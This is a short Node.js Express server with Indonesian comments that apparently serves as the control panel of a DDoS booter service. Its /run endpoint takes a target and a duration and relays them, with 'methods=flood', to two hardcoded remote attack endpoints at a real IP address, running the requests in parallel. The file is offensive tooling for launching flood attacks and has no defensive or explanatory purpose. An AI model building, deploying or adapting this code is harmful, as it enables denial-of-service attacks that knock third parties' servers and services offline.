const express = require("express");
const fetch = require("node-fetch");

const app = express();
const PORT = process.env.PORT || 3000;

// endpoint lo
const endpoints = [
  "http://178.128.95.130:2159/permen",
  "http://178.128.95.130:2281/permen"
];

// enable CORS
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  next();
});

// 🔥 FETCH WITH TIMEOUT + STATUS HANDLING
async function fetchSafe(url, timeout = 5000) {
  const start = Date.now();

  try {
    const response = await Promise.race([
      fetch(url),
      new Promise((_, reject) =>
        setTimeout(() => reject(new Error("TIMEOUT")), timeout)
      )
    ]);

    const text = await response.text();
    const duration = Date.now() - start;

    try {
      const json = JSON.parse(text);

      return {
        status: "OK",
        data: json,
        time: duration + "ms"
      };

    } catch {
      return {
        status: "OK",
        data: text,
        time: duration + "ms"
      };
    }

  } catch (err) {
    const duration = Date.now() - start;

    let status = "ERROR";

    if (err.message === "TIMEOUT") {
      status = "TIMEOUT";
    }

    return {
      status,
      error: err.message,
      time: duration + "ms"
    };
  }
}

app.get("/run", async (req, res) => {
  const { target, time } = req.query;

  if (!target || !time) {
    return res.status(400).json({
      success: false,
      error: "target & time wajib diisi"
    });
  }

  try {
    const urls = endpoints.map(base =>
      `${base}?target=${encodeURIComponent(target)}&time=${time}&methods=flood`
    );

    // 🔥 jalan paralel TANPA nge-block
    const results = await Promise.all(
      urls.map(url => fetchSafe(url))
    );

    res.json({
      success: true,
      total: results.length,
      results
    });

  } catch (err) {
    res.json({
      success: false,
      error: err.toString()
    });
  }
});

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
